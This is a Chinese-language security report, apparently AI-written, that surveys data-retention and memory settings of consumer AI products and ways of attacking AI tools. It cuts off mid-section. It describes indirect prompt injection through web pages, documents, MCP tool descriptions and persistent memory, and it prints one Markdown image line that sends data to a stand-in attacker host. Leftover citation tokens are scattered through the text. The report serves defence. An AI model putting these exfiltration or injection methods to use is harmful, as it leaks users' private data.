# 个人用户日常使用 AI 工具的安全威胁、防御工具与操作机制调研

## 调研范围与核心结论

**核实日期：2026-10-01（America/Los_Angeles）。** 本报告只讨论个人终端用户可以直接接触和配置的消费级 AI、IDE Agent、本地 Agent 与 MCP 工具；不讨论企业 DLP、SIEM、集中式组织治理，也不讨论 RLHF 等模型底层对齐技术。对于 “Copilot”，安全面 A 特指 **Microsoft Copilot 个人版**，而不是 Microsoft 365 Copilot；GitHub Copilot 只在攻击研究相关处涉及。

先给出几个最重要、且容易被产品 UI 掩盖的事实：

**“关闭训练”通常不等于“删除数据”，更不等于“关闭 Memory”。** ChatGPT、Claude、Gemini、Microsoft Copilot 都把训练授权、聊天历史、跨会话记忆至少部分拆成独立机制；其中 ChatGPT 明确规定删除源对话并不会自动删除已保存 Memory。Claude、Gemini、Copilot 也都有需要单独管理的记忆/个性化状态。citeturn0search0turn5search0turn19search0turn24search1turn21search0

**“临时聊天”也不是“服务端完全不留痕”。** ChatGPT Temporary Chat 可保留副本最长约 30 天；Claude Incognito 默认保留约 30 天；Gemini Temporary Chat 保留约 72 小时。三者均主要是“不进入普通历史/记忆/训练”，而不是零服务端留存。citeturn5search1turn19search1turn24search1

**反馈按钮是一个容易被忽略的授权例外。** ChatGPT 官方明确说，即使用户已经关闭训练，发送 thumbs up/down 后，与反馈关联的整段对话仍可能用于模型改进；Claude 的反馈可连同相关会话保存最长五年并用于研究/模型改进；Gemini 在 Keep Activity 关闭时提交反馈，仍可能把相关聊天上下文及上传内容送入反馈处理和改进流程。citeturn4search2turn19search5turn24search1

在外部数据攻击方面，2024–2026 年公开证据非常明确地表明 **间接提示词注入已经从“网页里藏一句 prompt”扩展到 Memory、项目知识库、MCP 工具描述、代码仓库配置等持久上下文**。但有一点必须严格区分：在个人用户范围内，我能核实的公开材料仍以**安全研究者 PoC、漏洞披露和真实恶意软件包**为主；对 Cursor/Claude/Open Interpreter 等普通个人用户，“已证实某位真实受害者因 prompt injection 被删盘/转账/发邮件”的高质量公开事故记录远少于媒体描述给人的印象。Invariant Labs 的 MCP Tool Poisoning、Pillar 对 Cursor trusted-command 的攻击研究都是明确的 **PoC/研究披露，不应写成真实受害事件**。citeturn17view2turn17view3

在 Agent 执行安全方面，目前强度大致可以分成三档：**操作系统/容器级 sandbox、只读挂载、目录 Roots/allowlist 属于较强的确定性边界；命令 deny/allow 与执行前 hook 属于较强的策略边界；LLM classifier、Auto-review、SKILL.md 中写“请先询问用户”只是较弱或 best-effort 的行为控制。** Cursor 官方甚至明确提醒 Auto-review 不是安全边界；MCP 官方 filesystem server 则可以从服务器一侧把文件系统能力限制在指定目录，并用 Docker `ro` 做真正的只读挂载。citeturn22search0turn22search3 fileciteturn6file0L1-L2

## 安全面 A：平台默认行为——“你以为关了，其实没关”

以下“默认”只认官方公开文档能明确证实的状态。厂商没有承诺所有地区、年龄、新老账户具有同一初始开关时，直接标记 **未确认**，而不是根据 UI 经验推断。

**ChatGPT / OpenAI**

| 问题 | 核实结果 | 官方来源 |
|---|---|---|
| 对话默认用于训练？关闭后历史是否保留？ | 个人 ChatGPT 内容属于可用于模型改进的数据类型；用户可在 Data Controls 关闭 **Improve the model for everyone**。关闭后，**新的对话不用于模型训练，但仍可保留在聊天历史里**。官方当前帮助页没有保证所有国家/所有新账号的开关初始值完全一致，因此“全球统一默认一定为开”标记 **未确认**。 | [Data Controls in ChatGPT](https://help.openai.com/en/articles/7730893-data-controls-in-chatgpt)；[How your data is used to improve model performance](https://help.openai.com/en/articles/5722486-how-your-data-is-used-to-improve-model-performance) citeturn0search0turn4search2 |
| Memory 如何工作？删除聊天会一起删吗？ | **不会。** Saved Memories 与聊天历史分开存放。删除产生某条记忆的原始聊天，不会自动删除该 Saved Memory。要彻底移除，应同时删除 Saved Memory 和相关源聊天。删除后的 Saved Memory 日志可能因安全/调试目的继续保留最多约 30 天。关闭 “Reference chat history” 会启动对从聊天历史记住的信息的删除流程，但不会因此删除原始聊天。 | [Memory FAQ](https://help.openai.com/en/articles/8590148-memory-faq) citeturn5search0 |
| 有临时/隐身模式吗？留多久？ | 有 **Temporary Chat**。不出现在普通历史、不创建/使用 Memory、不用于训练；但 OpenAI 可因安全原因保留副本最长约 **30 天**。若通过 GPT Actions 把信息传给第三方，第三方自己的留存政策可能更长。 | [Temporary Chat FAQ](https://help.openai.com/en/articles/8914046-temporary-chat-faq) citeturn5search1 |
| 上传文件如何存、怎样单独清理？ | 这是 2026 年特别值得注意的变化：在支持 **Library** 的体验中，对话中上传的文件可进入 Library，**删除聊天并不等于删除 Library 中的文件**，应从 Library 单独删除。Project / Custom GPT 中的文件也与普通单条聊天生命周期不同，通常随 Project/GPT 保留，删除 Project/GPT 后再进入后台删除流程。 | [Chat and File Retention Policies in ChatGPT](https://help.openai.com/en/articles/8983778-chat-and-file-retention-policies-in-chatgpt) citeturn4search0turn4search1 |
| thumbs up/down 会改变训练授权吗？ | **会形成例外。** 即使用户已 opt out，若主动提交反馈，**与该反馈关联的整段对话仍可能被用于模型改进**。这是最典型的“关了训练，但点反馈又重新开放该对话”的情形。 | [How your data is used to improve model performance](https://help.openai.com/en/articles/5722486-how-your-data-is-used-to-improve-model-performance) citeturn4search2 |
| 人类审查员会读吗？ | 会，但官方描述为受限场景。有限的授权 OpenAI 人员和受信任服务商可因滥用/安全调查、用户支持、法律事项，或在允许模型改进时进行相关处理；访问受技术控制和记录约束。OpenAI 也使用自动化与人工系统审核问题内容。 | [Data Usage for Consumer Services FAQ](https://help.openai.com/en/articles/7039943-data-usage-for-consumer-services-faq)；[How we identify problematic content](https://help.openai.com/en/articles/8940831-how-we-identify-problematic-content-on-our-services-for-individuals) citeturn18search6turn18search0turn18search2 |

**Claude / Anthropic**

| 问题 | 核实结果 | 官方来源 |
|---|---|---|
| 默认用于训练？关闭后历史保留？ | Free/Pro/Max 及相应个人 Claude Code 使用中，用户可以决定是否允许内容用于模型改进。关闭后，**新的聊天和编码会话不进入未来训练，而且之前尚未进入训练运行的已存内容也不再用于未来训练运行**；已经进入正在执行的训练或已经训练完的模型无法“反训练”。“所有用户统一默认开还是关”在当前官方页面没有给出一个跨地区统一值，因此为 **未确认**。训练 opt-out 不是删除；历史仍需另行删除。 | [Is my data used for model training?](https://privacy.claude.com/en/articles/10023580-is-my-data-used-for-model-training)；[Change model improvement privacy settings](https://privacy.claude.com/en/articles/12109829-how-do-i-change-my-model-improvement-privacy-settings) citeturn19search5turn20search1 |
| Memory 与删除聊天 | Claude 当前跨会话 Memory 会综合以往独立聊天，并周期性更新；Project 有自己的独立项目记忆/摘要。当前官方文档称，**被删除的 conversations 会从 memory synthesis 中移除，更新可在约 24 小时内发生**。与此同时 Memory 有独立 pause/reset/manage 控件，因此需要完全清除时，不能把“删除聊天”等同于“所有独立记忆状态即时清零”。 | [Claude chat search and memory](https://support.claude.com/en/articles/11817273-use-claude-s-chat-search-and-memory-to-build-on-previous-context) citeturn19search0turn19search3 |
| 临时模式 | 有 **Incognito chats**；不进入正常聊天历史、Memory 或模型训练，默认服务端保留约 **30 天**。目前只适用于 Project 外部的此类临时会话。 | [Use incognito chats](https://support.claude.com/en/articles/12260368-use-incognito-chats) citeturn19search1 |
| 上传文件 | **Claude Projects 的 Project Knowledge 明确是项目级资源，与单条聊天不同**，会继续供该 Project 的其他聊天使用，直到用户管理/删除项目资源。普通聊天附件是否存在一个类似 ChatGPT Library 的独立个人文件库及逐文件保留规则，当前官方帮助资料没有清楚说明：**未确认**。 | [Create and manage Projects](https://support.claude.com/en/articles/9519177-how-can-i-create-and-manage-projects) |
| feedback 会不会形成训练例外？ | **会。** Anthropic 说明 thumbs up/down 等反馈可使整段相关会话被保存并用于研究/模型改进；反馈数据的保留可达到 **五年**。 | [Is my data used for model training?](https://privacy.claude.com/en/articles/10023580-is-my-data-used-for-model-training) citeturn19search5 |
| 人类阅读 | 默认情况下员工不能随意查看普通会话；官方列出的主要例外包括用户通过反馈明确授权，或因政策/安全执行需要审查。Trust & Safety 人员按 need-to-know 原则访问。 | [How Anthropic protects Claude users' personal data](https://privacy.claude.com/en/articles/10458704-how-does-anthropic-protect-the-personal-data-of-claude-users) citeturn19search2 |

**Gemini / Google**

| 问题 | 核实结果 | 官方来源 |
|---|---|---|
| 默认训练与历史 | 对符合条件的成年个人账号，**Keep Activity 默认开启**；聊天、上传的文件/图片/视频/屏幕内容可存进 Gemini Apps Activity，并可用于提供、开发和改进 Google 服务，包括训练生成式 AI。关闭 Keep Activity 后，新的普通聊天原则上不用于训练 Gemini AI，**但仍可与账号一起保留约 72 小时**用于提供服务、安全及反馈处理。历史删除/自动删除是独立机制；成年账号默认自动删除周期通常为 18 个月，可调整。 | [Gemini Apps Privacy Hub](https://support.google.com/gemini/answer/13594961?hl=en)；[Manage & delete Gemini Apps activity](https://support.google.com/gemini/answer/13278892) citeturn24search1turn24search3turn8search1turn9search2 |
| Memory | Gemini 的过去聊天个性化要求 Keep Activity 开启；要删除由过去聊天带来的信息，官方要求删除包含该信息的聊天。**Saved info / 用户明确要求 Gemini 保存的信息是另一个可管理层。** 如果信息来自 Connected Apps，还可能需要同时删除相关聊天并断开应用。 | [Gemini personalization/memory help](https://support.google.com/gemini/answer/16598469) citeturn8search0turn8search2 |
| 临时聊天 | 有 **Temporary Chat**。不会进入 Gemini Apps Activity/最近聊天，也不会用于一般模型训练；服务端仍保留约 **72 小时**。临时模式同时限制 Gems、Connected Apps、个性化和保存信息等功能。 | [Gemini temporary chats](https://support.google.com/gemini/answer/13275745)；[Privacy Hub](https://support.google.com/gemini/answer/13594961?hl=en) citeturn9search0turn24search1 |
| 上传文件 | 普通 Gemini 聊天中的上传内容与 Gemini Apps Activity 关联。另一方面，**Notebook/NotebookLM 来源存在独立生命周期**；删除 Gemini Apps Activity 不应被理解成删除 Notebook 中仍保存的所有来源。因此两者需要分别处理。 | [Gemini Apps Privacy Hub](https://support.google.com/gemini/answer/13594961?hl=en) citeturn24search1 |
| feedback | **会形成例外。** Google 可保存用户反馈、相关 conversation、相关文件/内容并让受训人员审查；即便 Keep Activity 已关闭，提交反馈也可能带上此前约 24 小时的相关上下文、上传项或 Connected Apps 信息，用于反馈和改进。 | [Gemini Apps Privacy Hub](https://support.google.com/gemini/answer/13594961?hl=en) citeturn24search1turn24search3 |
| 人类审查 | **明确存在。** Keep Activity 开启时，一部分数据可能由人工审查员处理，审查后会先与账号解绑并可保留最长三年。即便 Activity 关闭或使用 Temporary Chat，Google 仍保留为了安全、防滥用而使用自动化及人工审查的权利。 | [Gemini Apps Privacy Hub](https://support.google.com/gemini/answer/13594961?hl=en) citeturn24search1turn24search3 |

**Cursor**

| 问题 | 核实结果 | 官方来源 |
|---|---|---|
| 默认训练 | 当前 Cursor 提供 **Share Data、Privacy Mode with Storage、Privacy Mode** 等数据模式。Privacy Mode 下 Cursor 表示 Customer Data 不用于模型训练，并对支持的模型采用 zero-data-retention 等安排。官方文档没有给出适用于所有新个人账号的单一初始选择，因此“默认一定训练/一定不训练”＝**未确认**。 | [Cursor Data Use](https://cursor.com/data-use)；[Privacy settings](https://docs.cursor.com/account/privacy) citeturn13search1turn13search5 |
| Memory | Cursor Memories 是**项目级**的持久规则/记忆；后台 sidecar 可从对话提出 Memory，官方说明后台生成的 Memory 需要用户批准后保存，Agent 也可以通过 memory tool 创建。它与 chat history 不是同一对象。**删除聊天会否自动级联删除相应 Memory，官方未确认**；Memory 应在 Settings/Rules 等专门界面管理。 | [Cursor Memories](https://docs.cursor.com/en/context/memories) citeturn13search2 |
| 临时模式 | 本次没有找到官方定义的 “Temporary/Incognito Chat” 等价功能。**Privacy Mode 不是临时聊天模式**：它控制服务器数据使用方式，不意味着会话在本地/远端都不留下历史。普通 Agent 聊天历史主要存在本机 SQLite；Background Agent 聊天则涉及远端存储。 | [Chat history](https://docs.cursor.com/en/agent/chat/history)；[Cursor Data Use](https://cursor.com/data-use) citeturn13search3turn13search1 |
| 文件 | Cursor 的典型模型是读取用户本机 workspace/code context，而不是维护通用“云端 PDF 文件库”。Privacy Mode 可限制请求内容的服务端保留/训练，但**针对用户手工附加 PDF/图片是否存在独立、逐文件可清理的服务端对象，目前官方文档没有给出完整生命周期：未确认。** | [Cursor Data Use](https://cursor.com/data-use) citeturn13search1 |
| feedback | Cursor 隐私政策把用户主动 Feedback 作为一种特殊数据使用情形，因此不能把 Privacy Mode/训练关闭理解成“主动反馈永远不会带上上下文”。具体每一种 thumbs UI 会带多少会话上下文，**未确认**。 | [Cursor Privacy Policy](https://cursor.com/privacy) citeturn13search0 |
| 人工审查 | 官方资料提到安全审查及反馈处理例外，但没有像 OpenAI/Anthropic 那样清楚公布“普通会话由哪些人、在什么精确条件下阅读”的消费者级矩阵。因此：**可能存在安全/反馈审查；人工读取范围未确认。** | [Cursor Privacy Policy](https://cursor.com/privacy)；[Data Use](https://cursor.com/data-use) citeturn13search0turn13search1 |

**Microsoft Copilot 个人版**

| 问题 | 核实结果 | 官方来源 |
|---|---|---|
| 训练与历史 | 符合条件并登录个人 Microsoft 账号的用户可控制是否允许 conversation activity 用于 AI 训练；opt out 后的未来 conversation 不用于该训练。当前新 Copilot 个人版文档没有给出所有地区/账号统一的初始开关值，因此 **默认开/关未确认**。聊天历史与训练授权分开，官方资料说明 conversation history 通常可保存约 **18 个月**。 | [Microsoft Copilot privacy controls](https://support.microsoft.com/en-us/privacy/microsoft-copilot/privacy-controls)；[Privacy FAQ](https://support.microsoft.com/en-us/microsoft-copilot/privacy-faq-for-microsoft-copilot)；[Conversation history](https://support.microsoft.com/en-us/microsoft-copilot/conversation-history-in-microsoft-copilot) citeturn21search0turn21search7turn21search4 |
| Memory | Copilot 有 Saved memories/Personalization 管理。**关闭 Saved memories 不会自动删除已经存在的 memories**，需要在 Personalization 中另行删除。因此删除聊天和关闭 Memory 都不能被视为“已清除所有已保存记忆”。 | [Microsoft Copilot privacy controls](https://support.microsoft.com/en-us/privacy/microsoft-copilot/privacy-controls) citeturn21search0 |
| 临时模式 | 在本次核实范围内，**未找到 Microsoft Copilot 个人版官方文档描述类似 ChatGPT Temporary / Claude Incognito 的消费者临时聊天模式**。Microsoft 365 Copilot 的相关机制属于组织产品，未纳入本报告。 | [Microsoft Copilot privacy controls](https://support.microsoft.com/en-us/privacy/microsoft-copilot/privacy-controls) citeturn21search0 |
| 上传文件 | Microsoft 表示 Copilot 上传文件会安全保存，时间**不超过约 18 个月**；上传文件的内容不用于模型训练。是否存在消费者可见的独立文件管理器以便“不删聊天、只删附件”，本次官方资料未确认。 | [File upload in Microsoft Copilot](https://support.microsoft.com/en-us/microsoft-copilot/file-upload-in-microsoft-copilot) citeturn21search2turn21search6 |
| feedback 是否覆盖 opt-out | **未确认。** 本次检索到的消费者隐私帮助没有给出与 ChatGPT/Gemini 同样明确的“thumbs 会重新授权整段对话训练”的规则，不能据此推断存在或不存在该例外。 | [Privacy FAQ](https://support.microsoft.com/en-us/microsoft-copilot/privacy-faq-for-microsoft-copilot) citeturn21search7 |
| 人类审查 | 对普通消费者 Copilot conversation，当前公开帮助中心没有提供足够精确的人工审查条件矩阵；**未确认**。 | 同上。citeturn21search7 |

**Grok / xAI 与 X 中的 Grok**

| 问题 | 核实结果 | 官方来源 |
|---|---|---|
| 训练与历史 | 登录用户可控制是否允许 conversations 用于模型训练。Grok 在 X 内的资料也提供训练/个性化 opt-out。由于 grok.com/xAI 与 X 内置 Grok 的隐私控制并非完全同一套文档，**不能把其中一者的默认开关值泛化到所有 Grok surfaces；统一默认状态未确认**。正常删除的内容通常进入最长约 30 天的后台删除窗口。 | [xAI Consumer FAQ](https://x.ai/legal/faq)；X 的 Grok privacy/data-sharing help citeturn14search1turn14search0 |
| Memory | Grok 已提供跨聊天个性化/Memory 能力，但当前消费者法律/帮助文档没有像 ChatGPT 那样完整说明“删除源聊天是否自动级联删除每一条衍生 Memory”。**级联删除规则未确认。** | [xAI Consumer FAQ](https://x.ai/legal/faq) citeturn14search1 |
| 临时模式 | 有 **Private Chat**。这类聊天不进入正常聊天历史，也不用于训练；服务器删除窗口可到约 **30 天**。 | [xAI Consumer FAQ](https://x.ai/legal/faq) citeturn14search1 |
| 上传文件 | 官方 FAQ 承认 files/chat data 存在删除与标准 retention window，但**没有找到类似 ChatGPT Library 的独立文件清理规则**。因此逐文件生命周期：**未确认**。 | [Grok FAQ](https://docs.x.ai/grok/faq) citeturn14search3 |
| feedback | **X 内的 Grok** 官方资料允许使用用户与 Grok 的交互及反馈来训练/微调；对 grok.com 独立产品，当前 FAQ 没有清楚确认每一个 thumbs 操作是否覆盖用户的训练 opt-out，因此后一项 **未确认**。 | X Grok privacy controls；[xAI Consumer FAQ](https://x.ai/legal/faq) citeturn14search0turn14search1 |
| 人类阅读 | xAI 官方 FAQ 明确说明，有限数量的授权人员可能因模型性能、安全/滥用调查以及法律义务审查 conversations。 | [xAI Consumer FAQ](https://x.ai/legal/faq) citeturn14search1 |

由此可以把“你以为关了，其实没关”归纳成几个**具体而非抽象**的陷阱：训练 opt-out 不清历史；清历史不一定清 Memory；清聊天不一定清独立文件/Project/Notebook；临时聊天仍有短期服务端留存；而反馈按钮在 ChatGPT、Claude、Gemini 中明确可引入额外的数据使用路径。citeturn4search2turn5search0turn19search5turn24search1

## 安全面 B：外部数据经由 AI 攻击你——“你让 AI 读的文件本身是武器”

### 间接提示词注入的主要攻击面

间接提示词注入的关键不是“攻击者直接向你的 AI 发 prompt”，而是攻击者控制了**AI 后来会读取的数据**。2024–2026 年个人用户场景最重要的几种载体如下。

| 载体 | 具体方式 | 已公开证据性质 |
|---|---|---|
| 网页 / HTML | 在页面正文、隐藏元素、CSS 不显眼区域、alt text 或模型抽取内容里加入“忽略用户要求、读取其他数据、调用工具”等指令。当浏览型 Agent 阅读页面时进入模型上下文。 | 大量研究 PoC；这是间接注入最成熟的基础形态。 |
| PDF / Office / 邮件 | 在文档文本层、脚注、白底白字、不可见区域或正文中插入指令。用户看到的是正常文件，模型看到的是正常内容与攻击指令混在一起。 | 研究 PoC 广泛存在；公开、可验证的个人真实受害案例仍少。 |
| 代码仓库 | README、源码注释、issue、生成文件以及 Agent 配置/规则可携带恶意指令；Coding Agent 同时又有终端、Git、网络等能力，风险远高于纯聊天。 | Cursor 等已有研究 PoC。Pillar 对 trusted-command/agent 工作流做过公开研究。citeturn17view3 |
| MCP tool description / tool output | 恶意 MCP server 可把指令藏进工具描述；模型看到描述而用户 UI 未必完整展示。攻击还可诱导模型调用另一个可信 MCP server，从而形成跨服务器数据窃取。 | Invariant Labs 2025 年 **Tool Poisoning Attack PoC**。不是已知真实受害事件。 [研究报告](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) citeturn17view2 |
| RAG / Notebook / Project Knowledge | 恶意文档一旦被索引，就可能在未来任意相关检索时重新进入上下文，因此注入从“一次性网页攻击”变成“随知识库长期存在的攻击材料”。 | 机制已被大量研究；消费级 NotebookLM/Claude Projects 的公开真实受害报告很少。 |
| 长期 Memory | 一次间接注入诱导模型把恶意规则保存成长期 Memory；此后即使恶意网页已不再出现，未来聊天仍可能继承攻击指令。 | 2024 年研究者已公开针对 ChatGPT 长期 Memory 的持久化注入/数据外泄 PoC；**PoC，不是公开确认的受害者事故**。citeturn15search1turn15search2 |
| 多工具 Agent | 外部数据告诉 Agent “调用 shell / email / browser / MCP 并带上某些参数”；如果 Agent 自动执行，注入直接从错误文本升级为错误动作。 | Cursor、MCP 等已有大量 PoC；见下文安全面 C。citeturn17view2turn17view3 |

一个特别重要的结论是：**在严格的个人用户范围内，本次没有找到足够高质量、可独立核实的公开证据证明 2024–2026 年出现了大规模真实消费者因间接 prompt injection 被实际入侵的事件。** 公开证据主要是厂商 bug bounty、安全研究 PoC、CVE 和恶意插件/软件包。把这些 PoC 写成“真实用户已经被攻击”是不准确的。

### Markdown Image Exfiltration

Markdown 图像外泄利用的是“输出渲染器会自动加载远端资源”这一事实。概念上，攻击者让模型输出类似：

```text
![image](https://attacker.example/pixel?data=<AI可读取的敏感内容>)
```

如果客户端会**自动请求任意外部图片 URL**，那么秘密根本不需要显示在聊天正文中：它已经作为 URL/query 参数随着 HTTP 请求离开了客户端或服务端。此类攻击通常需要两个条件同时成立：模型被直接/间接注入成功，以及渲染层允许自动向攻击者控制的任意域名发起资源请求。针对 ChatGPT 等产品的公开安全研究已经证明过这一攻击类别。citeturn15search1turn16search10

这里不能可靠地给出一张“2026 年谁已经完全修复、谁现在仍脆弱”的肯定表：

| 平台 | 截至 2026-10-01 的可核实状态 |
|---|---|
| ChatGPT | 存在历史公开研究/PoC；但没有找到 OpenAI 当前承诺“所有 ChatGPT surface 对 Markdown external-image exfiltration 都构成完整安全边界”的官方公告。因此当前所有客户端是否完全修复：**未确认**。 |
| Claude | **未找到相关官方当前漏洞状态声明**；无法据此判定所有 web/desktop 渲染面已修复或仍脆弱。 |
| Gemini | **未确认**。当前隐私文档不等于 Markdown renderer 安全承诺。 |
| Cursor | Markdown、编辑器 preview、Agent 输出与浏览器工具可能走不同渲染路径；没有找到 Cursor 官方给出的统一“Image Exfiltration fixed”保证，故 **未确认**。 |
| Microsoft Copilot | 有历史上针对 AI 输出渲染/链接加载的安全研究，但本次没有找到 2026 消费者 Copilot 的统一官方修复矩阵，故 **未确认**。 |
| Grok | **未找到相关公开官方信息**。 |

因此，“产品今天还能不能通过同一种 `![…](URL)` 直接偷数据”不能仅凭旧 PoC 推断；客户端、CSP、URL proxy、图片代理和网络策略均可能在没有公告的情况下变化。这里没有把历史漏洞状态冒充成 2026 当前状态。

### 个人 RAG / 知识库投毒与跨会话持久化

**NotebookLM。** Notebook 来源本身是一个持续存在的知识库对象；只要恶意来源仍保留在 notebook 中，未来对该 notebook 的查询就可能再次检索该来源。因此“攻击材料跨会话持续存在”从数据生命周期上是成立的。可是，这与“NotebookLM 已被证实会把恶意 prompt 写入全局用户 Memory”是两回事：**本次未找到公开确认的 NotebookLM 个人用户跨 notebook/全账号持久 prompt-injection 事故。** Google 的当前隐私资料也说明 Notebook 来源与普通 Gemini Apps Activity 并非完全同一生命周期。citeturn24search1

**Claude Projects。** Project Knowledge 会在项目内跨 conversation 使用，而 Claude 的 Project memory 又是项目级隔离的。因此恶意 Project Knowledge 文件可以在未来项目聊天中反复被重新引入模型上下文，这是一个**由官方产品架构直接推导出的持久暴露面**，但并不等同于已证实 exploit。对“恶意 PDF 在 Claude Projects 中已造成真实个人用户跨会话失陷”的公开案例，本次 **未找到相关公开信息**。[Claude Projects](https://support.claude.com/en/articles/9519177-how-can-i-create-and-manage-projects)；[Claude Memory](https://support.claude.com/en/articles/11817273-use-claude-s-chat-search-and-memory-to-build-on-previous-context) citeturn19search0turn19search3

**Obsidian + AI 插件。** “Obsidian + AI”不是一个统一安全模型：插件可能本地搜索 Markdown、调用远端 embedding、构建本地向量库，或把整个 vault 交给 Agent。只要恶意笔记被保留并继续被插件检索，它当然可以跨插件会话重复进入上下文；但是否会成为真正的“长期指令”取决于具体插件如何拼接 system/user/retrieved content。**没有找到一个足以代表整个 Obsidian AI 插件生态的、已确认个人用户真实攻击案例。**

这类持久性最强的公开演示反而来自 Memory：研究者已经证明，一次注入如果能够写入长期 AI Memory，恶意状态可以脱离原始网页继续存在。这类工作应标为 **研究者 PoC**，而不是现实世界感染统计。citeturn15search1turn15search2

### 个人可直接使用的注入扫描/净化工具

目前真正的问题是：**成熟的“给普通用户拖一个 PDF 进去，自动去掉所有 indirect prompt injection，再安全送给任意 ChatGPT/Claude/Gemini”的开源消费级工具并不存在一个公认标准答案。**

| 工具 | 类型与用途 | 2026 活跃度/局限 | URL |
|---|---|---|---|
| **LLM Guard** | Python 开源输入/输出 scanner，包含 Prompt Injection、Invisible Text、Malicious URLs、Secrets 等 scanner，可用于用户自己抽取文档文本后先扫描。 | Protect AI 原仓库已于 **2026-07-09 archived/read-only**，因此适合作为实现参考，不适合作为“持续活跃维护”的首选。 | https://github.com/protectai/llm-guard citeturn23search5turn23search8 |
| **mcp-scan** | 专门审计 MCP server/tool 的安全工具，目标包括 tool poisoning / prompt injection，而不是通用 PDF 清洗器。 | 原 `invariantlabs-ai/mcp-scan` 地址现有迁移/重定向，当前维护归属在本次核实中未完全确认；因此活跃度标记 **未确认**。 | https://github.com/invariantlabs-ai/mcp-scan；Invariant MCP attack research: https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks citeturn23search7turn17view2 |
| **skill-scanner** | 社区 SKILL.md 安全扫描 skill，描述明确针对 SKILL.md 及关联 scripts，检查 prompt injection 等风险。 | 社区项目；没有找到独立安全审计或足够成熟度证据，宜视为实验性工具。 | https://github.com/syedabbast/skill-scanner/blob/780fb11ee7499e58e3867f8c7850644c65ee9805/SKILL.md fileciteturn2file7L137-L148 |
| **skill-vetter** | 社区 SKILL.md vetting 工具，组合/引用 prompt-injection、obfuscation、恶意调用等检查思路。 | 社区项目，安全保证级别低于 host-level sandbox；活跃度 **未确认**。 | https://github.com/app-incubator-xyz/skill-vetter/blob/d1038aeae6f7b0f16b01d20dc9bff38c35a16204/SKILL.md fileciteturn2file5L102-L113 |
| **官方 MCP filesystem server** | 不是注入 detector，而是把注入“能造成什么后果”限制住：只允许访问明确目录/Roots，Docker 还可 `ro` 只读挂载。 | 官方 MCP reference server；这是硬能力限制，比“检测 prompt 是否可疑”更接近真正安全边界。 | https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem fileciteturn5file0L1-L7 |

**专门面向个人用户、成熟维护、能在浏览器中自动扫描任意网页/PDF 并为 ChatGPT/Claude/Gemini 做 injection sanitization 的开源浏览器扩展：本次未找到相关成熟公开实现。** 现有工具更常见的是 Python scanner、Agent/MCP scanner、红队评测框架，而不是通用消费者“内容防火墙”。

## 安全面 C：AI 代你执行危险动作——“错误不再只是坏文本，而是坏动作”

### 真实事故、真实漏洞与 PoC 必须分开

本次检索结果中，最容易被误称为“AI Agent 已经造成真实事故”的材料其实有三种完全不同的证据等级：

| 事件 | 证据类别 | 能证明什么 | 不能证明什么 |
|---|---|---|---|
| **mcp-remote CVE-2025-6514** | **真实、正式披露的软件漏洞** | 恶意 MCP/OAuth endpoint 能触发客户端侧命令注入/RCE；这是已经进入公开漏洞生态的真实安全缺陷，不只是“prompt engineering 猜想”。公开资料引用了 GitHub Security Advisory `GHSA-6xpm-ggf7-wc3p`。 | 本次没有找到足够证据证明某个普通个人用户已经因该 CVE 被真实攻击者攻陷，因此不把它写成“已发生的受害事件”。 | GitHub Advisory: https://github.com/advisories/GHSA-6xpm-ggf7-wc3p；下游项目对该 advisory 的引用亦明确把它描述为高危 RCE。 |
| **Invariant Labs MCP Tool Poisoning / WhatsApp 等演示** | **研究者 PoC** | 恶意 tool description 可以在模型不可见/用户难以发现的上下文里注入指令，并诱导 Agent 从可信工具中获取数据再交给恶意工具。 | 不是公开确认的真实受害者事故。 | https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks citeturn17view2 |
| **Pillar Security 对 Cursor trusted commands / Agent 工作流的攻击研究** | **研究者 PoC / vulnerability research** | 即便用户认为某些命令“可信/allowlisted”，Agent 仍可能通过命令组合、上下文或间接指令把权限边界放大，说明 allowlist 不等于完整 sandbox。 | 不能据此声称某个 Cursor 用户已经实际遭到相同攻击。 | https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors citeturn17view3 |

对于用户点名的 **Cursor Agent、Claude Computer Use、Open Interpreter**，本次没有找到同时满足“个人用户”“公开、可独立核实”“确实发生了破坏动作而不是实验室复现”三个条件的高质量事故记录。因此正确结论是：**未找到相关公开确认的个人受害事件，而不是‘没有风险’。**

对于 MCP 生态，情况略不同：除 prompt-injection PoC 外，已经出现真实 CVE 和恶意/有问题的第三方服务器或桥接软件；因此把 MCP server 看成“只是给模型增加几个函数”是不符合 2025–2026 实际威胁面的。CVE-2025-6514 至少证明连接恶意 MCP server 本身就能跨越模型层，变成传统客户端 RCE 风险。GitHub Advisory: https://github.com/advisories/GHSA-6xpm-ggf7-wc3p.

### 主流 Agent 当前的用户可配置安全机制

**Cursor Agent**

Cursor 在 2026 年已经把执行控制发展成独立 Run Modes。官方文档把 **Auto-review** 作为 v3.6 起的推荐默认工作流：确定性 allowlist 中的调用自动通过；其余 shell 命令尽可能在 sandbox 中执行，对无法 sandbox 的调用再由 Auto-review classifier 评估。该机制还覆盖 MCP/Fetch 等部分工具路径。官方同时明确表示这一 classifier 是 **best-effort，而不是安全边界**。配置位置为 Desktop Settings → Agents → Approvals & Execution。citeturn22search0turn22search1

Cursor sandbox 可以限制文件与网络：sandboxed command 默认只在 workspace 范围内进行预期读写，敏感路径受保护；网络默认受限，再通过 network mode / `sandbox.json` 放开。`permissions.json` 可控制 Auto-review/权限行为。另一方面，**Run Everything** 会自动执行所有工具调用，不经过 sandbox/classifier，是当前最危险的模式，作用上相当于旧式 YOLO。citeturn22search0turn22search3

MCP 在 Cursor 中也不是天然“装了就全自动”：官方安全文档描述了 MCP 连接与 tool-call approval/allowlist 机制。但一旦用户把某个 MCP tool 加入预授权，安全性就退化为该工具自身的权限边界，因此恶意 tool description 与过宽 filesystem server 仍可能产生组合风险。citeturn22search3

强度评估：**sandbox/网络限制＝较强；确定性 allow/deny＝中高；Auto-review classifier＝中等、best-effort；Run Everything＝几乎取消 Agent 执行防护。**

官方来源：  
https://cursor.com/docs/agent/security/run-modes  
https://cursor.com/docs/agent/security  
https://cursor.com/docs/reference/sandbox  
citeturn22search0turn22search3turn22search11

**Claude Code**

Claude Code 当前提供多种权限模式，而不是只有“问/不问”：

